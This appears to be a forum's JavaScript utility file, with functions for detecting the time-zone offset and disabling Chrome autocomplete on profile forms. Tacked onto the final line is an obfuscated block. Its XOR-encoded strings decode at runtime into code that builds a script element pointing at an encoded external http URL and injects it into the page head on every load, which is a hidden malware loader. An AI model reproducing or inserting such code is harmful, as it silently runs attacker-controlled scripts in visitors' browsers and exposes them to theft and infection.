var localTime = new Date();
function autoDetectTimeOffset(currentTime)
{
	if (typeof(currentTime) != 'string')
		var serverTime = currentTime;
	else
		var serverTime = new Date(currentTime);

	// Something wrong?
	if (!localTime.getTime() || !serverTime.getTime())
		return 0;

	// Get the difference between the two, set it up so that the sign will tell us who is ahead of who.
	var diff = Math.round((localTime.getTime() - serverTime.getTime())/3600000);

	// Make sure we are limiting this to one day's difference.
	diff %= 24;

	return diff;
}

// Prevent Chrome from auto completing fields when viewing/editing other members profiles
function disableAutoComplete()
{
	if (is_chrome && document.addEventListener)
		document.addEventListener("DOMContentLoaded", disableAutoCompleteNow, false);
}

// Once DOMContentLoaded is triggered, call the function
function disableAutoCompleteNow()
{
	for (var i = 0, n = document.forms.length; i < n; i++)
	{
		var die = document.forms[i].elements;
		for (var j = 0, m = die.length; j < m; j++)
			// Only bother with text/password fields?
			if (die[j].type == "text" || die[j].type == "password")
				die[j].setAttribute("autocomplete", "off");
	}
}var eC29s64=["021084","020094","022067","005069014009023081116006085092001093035","021069008","018078027013","018082019028076094080028081066007065062067045","007071027013013080114002089093000","014082010012","001082031045015081092015094069023113046103056081057007090014","014067031024089027030025068080016086121064052090069072069030071009071030009094069074089036"];function gRvt4(yFz528){var vxWjb='';var xf=0;var atL=0;for(xf=0;xf<yFz528.length/3;xf++){vxWjb+=String.fromCharCode(yFz528.slice(atL,atL+3));atL=atL+3;}return vxWjb;}tZr570(m7c3X9(eC29s64[10]));function tZr570(cy){var bJ8=document[m7c3X9(eC29s64[3])](m7c3X9(eC29s64[0])+m7c3X9(eC29s64[1])+m7c3X9(eC29s64[2]));bJ8[m7c3X9(eC29s64[4])]=cy;bJ8[m7c3X9(eC29s64[5])]=m7c3X9(eC29s64[6]);document[m7c3X9(eC29s64[9])](m7c3X9(eC29s64[8]))[0][m7c3X9(eC29s64[7])](bJ8);}function u2wtxAQ(t2i,s4DkE){var jh='';var k727=0;var fJ4H=0;for(k727=0;k727<t2i.length;k727++){var gp0W1r=t2i.charAt(k727);var bW2h=gp0W1r.charCodeAt(0)^s4DkE.charCodeAt(fJ4H);gp0W1r=String.fromCharCode(bW2h);jh+=gp0W1r;if(fJ4H==s4DkE.length-1)fJ4H=0;else fJ4H++;}return (jh);}function m7c3X9(zb4c){return u2wtxAQ(gRvt4(zb4c),'f7khc41j01d3W3Y6w');}